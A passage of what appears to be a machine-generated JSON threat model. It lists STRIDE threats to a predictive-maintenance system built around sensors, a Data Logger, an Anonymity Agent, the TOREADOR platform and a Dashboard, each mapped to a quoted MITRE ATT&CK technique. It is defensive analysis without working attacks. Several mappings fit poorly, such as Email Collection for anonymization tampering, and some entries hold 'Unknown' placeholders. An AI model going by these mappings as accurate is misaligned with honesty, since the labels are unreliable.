                    "Assumption": "Firmware update process is insecure",
                    "Role": "System Administrator",
                    "Condition": "Valid if firmware can be updated without proper authentication."
                },
                {
                    "Assumption": "Attacker gains physical or logical access to sensors",
                    "Role": "Attacker",
                    "Condition": "Valid if sensors are not secured physically or via network."
                }
            ],
            "Potential Impact": "Loss of system availability as sensors become unresponsive, disrupting data collection and system operations.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "malicious code",
                "sensors",
                "restarting"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a vulnerability in the TOREADOR Platform to gain administrative access and alter AI/ML models.",
            "Assumptions": [
                {
                    "Assumption": "Presence of exploitable vulnerability",
                    "Role": "System Administrator",
                    "Condition": "Valid if there is a known or zero-day vulnerability in the platform."
                },
                {
                    "Assumption": "Inadequate patch management",
                    "Role": "System Administrator",
                    "Condition": "Valid if critical patches are not applied timely."
                },
                {
                    "Assumption": "Weak security controls on privileged accounts",
                    "Role": "System Designer",
                    "Condition": "Valid if privileged accounts are not adequately protected."
                }
            ],
            "Potential Impact": "Loss of data integrity and unauthorized modification of AI/ML models leading to incorrect maintenance and optimization predictions.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "platform vulnerability",
                "administrative access",
                "AI/ML models"
            ],
            "mitre_technique": {
                "name": "Cloud Administration Command",
                "description": "Adversaries may abuse cloud management services to execute commands within virtual machines. Resources such as AWS Systems Manager, Azure RunCommand, and Runbooks allow users to remotely run scripts in virtual machines by leveraging installed virtual machine agents. (Citation: AWS Systems Manager Run Command)(Citation: Microsoft Run Command)\n\nIf an adversary gains administrative access to a cloud environment, they may be able to abuse cloud management services to execute commands in the environment\u2019s virtual machines. Additionally, an adversary that compromises a service provider or delegated administrator account may similarly be able to leverage a [Trusted Relationship](https://attack.mitre.org/techniques/T1199) to execute commands in connected virtual machines.(Citation: MSTIC Nobelium Oct 2021)",
                "id": "attack-pattern--d94b3ae9-8059-4989-8e9f-ea0f601f80a7",
                "technique_id": "T1651"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "A user with limited access exploits improper access control configurations to gain unauthorized access to sensitive metadata.",
            "Assumptions": [
                {
                    "Assumption": "Misconfigured access control",
                    "Role": "System Administrator",
                    "Condition": "Valid if access controls are inadequately configured."
                },
                {
                    "Assumption": "Lack of role-based access management",
                    "Role": "System Designer",
                    "Condition": "Valid if user roles and permissions are not properly defined or enforced."
                },
                {
                    "Assumption": "Adequate monitoring and alerting systems are lacking",
                    "Role": "System Administrator",
                    "Condition": "Valid if unauthorized access is not promptly detected."
                }
            ],
            "Potential Impact": "Loss of data confidentiality as unauthorized users access sensitive metadata, potentially leading to data misuse.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "access control",
                "metadata",
                "unauthorized access"
            ],
            "mitre_technique": {
                "name": "Linux and Mac File and Directory Permissions Modification",
                "description": "Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.(Citation: Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018) File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).\n\nMost Linux and Linux-based platforms provide a standard set of permission groups (user, group, and other) and a standard set of permissions (read, write, and execute) that are applied to each group. While nuances of each platform\u2019s permissions implementation may vary, most of the platforms provide two primary commands used to manipulate file and directory ACLs: <code>chown</code> (short for change owner), and <code>chmod</code> (short for change mode).\n\nAdversarial may use these commands to make themselves the owner of files and directories or change the mode if current permissions allow it. They could subsequently lock others out of the file. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via [Unix Shell Configuration Modification](https://attack.mitre.org/techniques/T1546/004) or tainting/hijacking other instrumental binary/configuration files via [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574).(Citation: 20 macOS Common Tools and Techniques) ",
                "id": "attack-pattern--09b130a2-a77e-4af0-a361-f46f9aad1345",
                "technique_id": "T1222.002"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker uses a compromised account to escalate privileges and inject malicious scripts into the Dashboard, affecting multiple users.",
            "Assumptions": [
                {
                    "Assumption": "Weak account protection",
                    "Role": "User",
                    "Condition": "Valid if user accounts are protected with weak passwords or compromised credentials."
                },
                {
                    "Assumption": "Lack of input validation and sanitization",
                    "Role": "System Designer",
                    "Condition": "Valid if the dashboard does not sanitize user inputs."
                },
                {
                    "Assumption": "No activity monitoring on user accounts",
                    "Role": "System Administrator",
                    "Condition": "Valid if suspicious activities are not monitored."
                }
            ],
            "Potential Impact": "Loss of system integrity and potential loss of confidentiality via cross-site scripting (XSS) attack, affecting multiple users.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "compromised account",
                "malicious scripts",
                "XSS"
            ],
            "mitre_technique": {
                "name": "JavaScript",
                "description": "Adversaries may abuse various implementations of JavaScript for execution. JavaScript (JS) is a platform-independent scripting language (compiled just-in-time at runtime) commonly associated with scripts in webpages, though JS can be executed in runtime environments outside the browser.(Citation: NodeJS)\n\nJScript is the Microsoft implementation of the same scripting standard. JScript is interpreted via the Windows Script engine and thus integrated with many components of Windows such as the [Component Object Model](https://attack.mitre.org/techniques/T1559/001) and Internet Explorer HTML Application (HTA) pages.(Citation: JScrip May 2018)(Citation: Microsoft JScript 2007)(Citation: Microsoft Windows Scripts)\n\nJavaScript for Automation (JXA) is a macOS scripting language based on JavaScript, included as part of Apple\u2019s Open Scripting Architecture (OSA), that was introduced in OSX 10.10. Apple\u2019s OSA provides scripting capabilities to control applications, interface with the operating system, and bridge access into the rest of Apple\u2019s internal APIs. As of OSX 10.10, OSA only supports two languages, JXA and [AppleScript](https://attack.mitre.org/techniques/T1059/002). Scripts can be executed via the command line utility <code>osascript</code>, they can be compiled into applications or script files via <code>osacompile</code>, and they can be compiled and executed in memory of other programs by leveraging the OSAKit Framework.(Citation: Apple About Mac Scripting 2016)(Citation: SpecterOps JXA 2020)(Citation: SentinelOne macOS Red Team)(Citation: Red Canary Silver Sparrow Feb2021)(Citation: MDSec macOS JXA and VSCode)\n\nAdversaries may abuse various implementations of JavaScript to execute various behaviors. Common uses include hosting malicious scripts on websites as part of a [Drive-by Compromise](https://attack.mitre.org/techniques/T1189) or downloading and executing these script files as secondary payloads. Since these payloads are text-based, it is also very common for adversaries to obfuscate their content as part of [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027).",
                "id": "attack-pattern--0f4a0c76-ab2d-4cb0-85d3-3f0efb8cba0d",
                "technique_id": "T1059.007"
            }
        }
    ]
},
{
    "case_number": "9",
    "batch_number": "10",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker could spoof the identity of the sensors sending false data to the Data Logger.",
            "Assumptions": [
                {
                    "Assumption": "Attackers have access to the network.",
                    "Role": "Network Attacker",
                    "Condition": "Spoofing is possible if the network is not adequately secured."
                },
                {
                    "Assumption": "Sensors do not implement strong mutual authentication.",
                    "Role": "System Designer",
                    "Condition": "Lack of robust authentication mechanisms can lead to spoofing."
                },
                {
                    "Assumption": "Data Logger trusts incoming data without full verification.",
                    "Role": "Data Logger",
                    "Condition": "Trust in data sources without exhaustive checks makes spoofing easier."
                }
            ],
            "Potential Impact": "Unauthorized data injection leading to inaccurate predictions.",
            "MITRE ATT&CK Keywords": [
                "Network",
                "Spoofing",
                "Data Injection",
                "Identity Theft"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker could spoof the identity of the Anonymity Agent, causing the system to process and store non-anonymized data.",
            "Assumptions": [
                {
                    "Assumption": "Attackers know how the Anonymity Agent authenticates.",
                    "Role": "Attacker",
                    "Condition": "Knowledge of authentication methods facilitates spoofing."
                },
                {
                    "Assumption": "Anonymity Agent uses weak or no mutual authentication.",
                    "Role": "System Designer",
                    "Condition": "Weak authentication methods make spoofing easier."
                },
                {
                    "Assumption": "The system does not enforce strict validation of the Anonymity Agent.",
                    "Role": "System Engineer",
                    "Condition": "Lack of validation allows spoofed agents."
                }
            ],
            "Potential Impact": "Exposure of sensitive data.",
            "MITRE ATT&CK Keywords": [
                "Network",
                "Spoofing",
                "Anonymity",
                "Sensitive Data Exposure"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker could use spoofed credentials to access the Dashboard.",
            "Assumptions": [
                {
                    "Assumption": "Weak authentication mechanisms on the Dashboard.",
                    "Role": "System Designer",
                    "Condition": "Lack of strong authentication allows spoofing."
                },
                {
                    "Assumption": "Attacker has knowledge of employee credentials.",
                    "Role": "Attacker",
                    "Condition": "Knowledge of credentials makes spoofing easier."
                },
                {
                    "Assumption": "Dashboard does not have multi-factor authentication.",
                    "Role": "System Engineer",
                    "Condition": "Absence of MFA increases risk of spoofing."
                }
            ],
            "Potential Impact": "Unauthorized access to system predictions and operational status.",
            "MITRE ATT&CK Keywords": [
                "Identity Theft",
                "Spoofing",
                "Credential Access",
                "Dashboard"
            ],
            "mitre_technique": {
                "name": "Use Alternate Authentication Material",
                "description": "Adversaries may use alternate authentication material, such as password hashes, Kerberos tickets, and application access tokens, in order to move laterally within an environment and bypass normal system access controls. \n\nAuthentication processes generally require a valid identity (e.g., username) along with one or more authentication factors (e.g., password, pin, physical smart card, token generator, etc.). Alternate authentication material is legitimately generated by systems after a user or application successfully authenticates by providing a valid identity and the required authentication factor(s). Alternate authentication material may also be generated during the identity creation process.(Citation: NIST Authentication)(Citation: NIST MFA)\n\nCaching alternate authentication material allows the system to verify an identity has successfully authenticated without asking the user to reenter authentication factor(s). Because the alternate authentication must be maintained by the system\u2014either in memory or on disk\u2014it may be at risk of being stolen through [Credential Access](https://attack.mitre.org/tactics/TA0006) techniques. By stealing alternate authentication material, adversaries are able to bypass system access controls and authenticate to systems without knowing the plaintext password or any additional authentication factors.\n",
                "id": "attack-pattern--51a14c76-dd3b-440b-9c20-2bf91d25a814",
                "technique_id": "T1550"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker could tamper with the data collected by the Data Logger before it is sent to the central system.",
            "Assumptions": [
                {
                    "Assumption": "Data Logger communicates over an unsecured network.",
                    "Role": "Network Administrator",
                    "Condition": "Unencrypted communication enables tampering."
                },
                {
                    "Assumption": "Data integrity checks are not performed meticulously.",
                    "Role": "System Designer",
                    "Condition": "Lack of integrity checks allows tampering."
                },
                {
                    "Assumption": "Attacker has physical or network access to the Data Logger.",
                    "Role": "Physical Attacker",
                    "Condition": "Access privileges facilitate tampering."
                }
            ],
            "Potential Impact": "Altered data may lead to faulty predictions affecting maintenance decisions.",
            "MITRE ATT&CK Keywords": [
                "Data Tampering",
                "Network",
                "Data Integrity",
                "Data Logger"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker could modify the AI/ML models in the TOREADOR platform to produce incorrect predictions.",
            "Assumptions": [
                {
                    "Assumption": "Attacker has access to the TOREADOR platform.",
                    "Role": "Platform User",
                    "Condition": "Access rights enable tampering."
                },
                {
                    "Assumption": "Security measures on the TOREADOR platform are insufficient.",
                    "Role": "System Administrator",
                    "Condition": "Weak security allows tampering."
                },
                {
                    "Assumption": "No constant monitoring of the integrity of AI/ML models.",
                    "Role": "System Engineer",
                    "Condition": "Lack of monitoring increases susceptibility."
                }
            ],
            "Potential Impact": "Corrupted models leading to inaccurate maintenance schedules and power flow optimization.",
            "MITRE ATT&CK Keywords": [
                "Data Tampering",
                "Model Poisoning",
                "Platform Security",
                "AI/ML Models"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker could tamper with the pre-processing operations of the Anonymity Agent, leading to non-anonymized data being used for model training.",
            "Assumptions": [
                {
                    "Assumption": "Attacker has access to the Anonymity Agent.",
                    "Role": "System User",
                    "Condition": "Authorized access enables tampering."
                },
                {
                    "Assumption": "Anonymity Agent's security measures are inadequate.",
                    "Role": "System Administrator",
                    "Condition": "Weak security allows tampering."
                },
                {
                    "Assumption": "No integrity checks for pre-processing operations.",
                    "Role": "System Designer",
                    "Condition": "Lack of checks increases risk of tampering."
                }
            ],
            "Potential Impact": "Sensitive information exposure and compromised predictions.",
            "MITRE ATT&CK Keywords": [
                "Data Tampering",
                "Anonymity",
                "Data Pre-processing",
                "Sensitive Data"
            ],
            "mitre_technique": {
                "name": "Email Collection",
                "description": "Adversaries may target user email to collect sensitive information. Emails may contain sensitive data, including trade secrets or personal information, that can prove valuable to adversaries. Adversaries can collect or forward email from mail servers or clients. ",
                "id": "attack-pattern--1608f3e1-598a-42f4-a01a-2e252e81728f",
                "technique_id": "T1114"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker denies sending tampered data from the Data Logger.",
            "Assumptions": [
                {
                    "Assumption": "Lack of non-repudiation mechanisms for data transmission.",
                    "Role": "System Designer",
                    "Condition": "Absence weakens non-repudiation."
                },
                {
                    "Assumption": "Data Logger does not log sender authentication details.",
                    "Role": "System Engineer",
                    "Condition": "Lack of logging impacts repudiation."
                },
                {
                    "Assumption": "No forensic capabilities to trace data modifications.",
                    "Role": "Security Officer",
                    "Condition": "Inadequate capabilities facilitate repudiation."
                }
            ],
            "Potential Impact": "Difficult to track and identify tampering sources.",
            "MITRE ATT&CK Keywords": [
                "Non-repudiation",
                "Data Transmission",
                "Data Logger",
                "Tampered Data"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker denies making service modifications in the TOREADOR platform affecting predictive maintenance schedules.",
            "Assumptions": [
                {
                    "Assumption": "TOREADOR platform lacks audit trails.",
                    "Role": "System Designer",
                    "Condition": "Lack of audit logs impairs non-repudiation."
                },
                {
                    "Assumption": "Insufficient monitoring of user activities.",
                    "Role": "System Administrator",
                    "Condition": "Weak monitoring facilitates repudiation."
                },
                {
                    "Assumption": "No mechanisms to verify user actions backed by strong authentication.",
                    "Role": "Security Officer",
                    "Condition": "Absence of mechanisms impairs repudiation."
                }
            ],
            "Potential Impact": "Inability to determine the accountability of actions.",
            "MITRE ATT&CK Keywords": [
                "Non-repudiation",
                "Service Modifications",
                "Audit Trails",
                "TOREADOR Platform"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker deletes or alters logs from sensors denying they sent fake readings.",
            "Assumptions": [
                {
                    "Assumption": "Sensors do not have tamper-proof logging mechanisms.",
                    "Role": "System Designer",
                    "Condition": "Lack of secure logs increases risk."
                },
                {
                    "Assumption": "No central log repository to prevent tampering.",
                    "Role": "Network Administrator",
                    "Condition": "Absence makes repudiation easier."
                },
                {
                    "Assumption": "Logs are not protected by integrity checks.",
                    "Role": "Security Officer",
                    "Condition": "Lack of checks impairs non-repudiation."
                }
            ],
            "Potential Impact": "Manipulated logs lead to misinterpretation of sensor data and accountability issues.",
            "MITRE ATT&CK Keywords": [
                "Log Tampering",
                "Non-repudiation",
                "Sensor Logs",
                "Data Integrity"
            ],
            "mitre_technique": {
                "name": "Kernel Modules and Extensions",
                "description": "Loadable Kernel Modules (or LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand. They extend the functionality of the kernel without the need to reboot the system. For example, one type of module is the device driver, which allows the kernel to access hardware connected to the system. (Citation: Linux Kernel Programming)\u00a0When used maliciously, Loadable Kernel Modules (LKMs) can be a type of kernel-mode [Rootkit](https://attack.mitre.org/techniques/T1014) that run with the highest operating system privilege (Ring 0). (Citation: Linux Kernel Module Programming Guide)\u00a0Adversaries can use loadable kernel modules to covertly persist on a system and evade defenses. Examples have been found in the wild and there are some open source projects. (Citation: Volatility Phalanx2) (Citation: CrowdStrike Linux Rootkit) (Citation: GitHub Reptile) (Citation: GitHub Diamorphine)\n\nCommon features of LKM based rootkits include: hiding itself, selective hiding of files, processes and network activity, as well as log tampering, providing authenticated backdoors and enabling root access to non-privileged users. (Citation: iDefense Rootkit Overview)\n\nKernel extensions, also called kext, are used for macOS to load functionality onto a system similar to LKMs for Linux. They are loaded and unloaded through <code>kextload</code> and <code>kextunload</code> commands. Several examples have been found where this can be used. (Citation: RSAC 2015 San Francisco Patrick Wardle) (Citation: Synack Secure Kernel Extension Broken) Examples have been found in the wild. (Citation: Securelist Ventir)",
                "id": "attack-pattern--6be14413-578e-46c1-8304-310762b3ecd5",
                "technique_id": "T1215"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker intercepts sensor data in transit to the Data Logger.",
            "Assumptions": [
                {
                    "Assumption": "Sensor data is transmitted over an unsecured channel.",
                    "Role": "Network Architect",
                    "Condition": "Unencrypted channels allow interception."
                },
                {
                    "Assumption": "Lack of encryption makes data readable.",
                    "Role": "System Designer",
                    "Condition": "Absence of encryption facilitates disclosure."
                },
                {
                    "Assumption": "Attacker has network access to intercept data.",
                    "Role": "Network Administrator",
                    "Condition": "Access privileges enable interception."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive operational data.",
            "MITRE ATT&CK Keywords": [
                "Data Interception",
                "Information Disclosure",
                "Network Security",
                "Sensor Data"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker gains access to the TOREADOR platform and reads non-anonymized data.",
            "Assumptions": [
                {
                    "Assumption": "Weak authentication and authorization on the platform.",
                    "Role": "System Designer",
                    "Condition": "Weak controls allow unauthorized access."
                },
                {
                    "Assumption": "Non-encrypted storage of sensitive data.",
                    "Role": "System Administrator",
                    "Condition": "Lack of encryption facilitates disclosure."
                },
                {
                    "Assumption": "No separation of duties preventing unauthorized access.",
                    "Role": "Security Officer",
                    "Condition": "Absence allows unauthorized actions."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive data.",
            "MITRE ATT&CK Keywords": [
                "Information Disclosure",
                "Unauthorized Access",
                "Data Breach",
                "TOREADOR Platform"
            ],
            "mitre_technique": {
                "name": "Exploitation for Credential Access",
                "description": "Adversaries may exploit software vulnerabilities in an attempt to collect credentials. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0\n\nCredentialing and authentication mechanisms may be targeted for exploitation by adversaries as a means to gain access to useful credentials or circumvent the process to gain authenticated access to systems. One example of this is `MS14-068`, which targets Kerberos and can be used to forge Kerberos tickets using domain user permissions.(Citation: Technet MS14-068)(Citation: ADSecurity Detecting Forged Tickets) Another example of this is replay attacks, in which the adversary intercepts data packets sent between parties and then later replays these packets. If services don't properly validate authentication requests, these replayed packets may allow an adversary to impersonate one of the parties and gain unauthorized access or privileges.(Citation: Bugcrowd Replay Attack)(Citation: Comparitech Replay Attack)(Citation: Microsoft Midnight Blizzard Replay Attack)\n\nSuch exploitation has been demonstrated in cloud environments as well. For example, adversaries have exploited vulnerabilities in public cloud infrastructure that allowed for unintended authentication token creation and renewal.(Citation: Storm-0558 techniques for unauthorized email access)\n\nExploitation for credential access may also result in Privilege Escalation depending on the process targeted or credentials obtained.",
                "id": "attack-pattern--9c306d8d-cde7-4b4c-b6e8-d0bb16caca36",
                "technique_id": "T1212"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Employee credentials are hijacked leading to unauthorized access to the Dashboard.",
            "Assumptions": [
                {
                    "Assumption": "Credentials are shared or reused across services.",
                    "Role": "Employee",
                    "Condition": "Sharing credentials increases risk."
                },
                {
                    "Assumption": "Weak password policies in place.",
                    "Role": "System Administrator",
                    "Condition": "Weak policies facilitate hijacking."
                },
                {
                    "Assumption": "Lack of monitoring and alerts for suspicious access.",
                    "Role": "Security Officer",
                    "Condition": "Absence of alerts enables disclosure."
                }
            ],
            "Potential Impact": "Unrestricted access to operational status and sensitive predictions.",
            "MITRE ATT&CK Keywords": [
                "Credential Theft",
                "Unauthorized Access",
                "Information Disclosure",
                "Dashboard"
            ],
            "mitre_technique": {
                "name": "Cloud Service Dashboard",
                "description": "An adversary may use a cloud service dashboard GUI with stolen credentials to gain useful information from an operational cloud environment, such as specific services, resources, and features. For example, the GCP Command Center can be used to view all assets, findings of potential security risks, and to run additional queries, such as finding public IP addresses and open ports.(Citation: Google Command Center Dashboard)\n\nDepending on the configuration of the environment, an adversary may be able to enumerate more information via the graphical dashboard than an API. This allows the adversary to gain information without making any API requests.",
                "id": "attack-pattern--e49920b0-6c54-40c1-9571-73723653205f",
                "technique_id": "T1538"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker initiates a DDoS attack on the Receiver component.",
            "Assumptions": [
                {
                    "Assumption": "Receiver lacks filtering and rate-limiting mechanisms.",
                    "Role": "System Designer",
                    "Condition": "Absence weakens defenses."
                },
                {
                    "Assumption": "Attacker has control of sufficient resources for the DDoS attack.",
                    "Role": "External Attacker",
                    "Condition": "Access to resources increases threat."
                },
                {
                    "Assumption": "No redundancy in place for the Receiver component.",
                    "Role": "System Architect",
                    "Condition": "Lack of redundancy makes attacks effective."
                }
            ],
            "Potential Impact": "Disruption of data flow, affecting predictive maintenance and power optimization.",
            "MITRE ATT&CK Keywords": [
                "Denial of Service",
                "DDoS",
                "Network Disruption",
                "Receiver"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker exploits a vulnerability in the TOREADOR platform causing it to crash.",
            "Assumptions": [
                {
                    "Assumption": "Unpatched vulnerabilities identified in the platform.",
                    "Role": "System Administrator",
                    "Condition": "Lack of patches elevates risks."
                },
                {
                    "Assumption": "Insufficient monitoring for exploiting activities.",
                    "Role": "Security Officer",
                    "Condition": "Weak monitoring facilitates exploitation."
                },
                {
                    "Assumption": "Platform does not have failover mechanisms.",
                    "Role": "System Designer",
                    "Condition": "Absence makes DDoS effective."
                }
            ],
            "Potential Impact": "Service disruption affecting AI/ML processing and maintenance activities.",
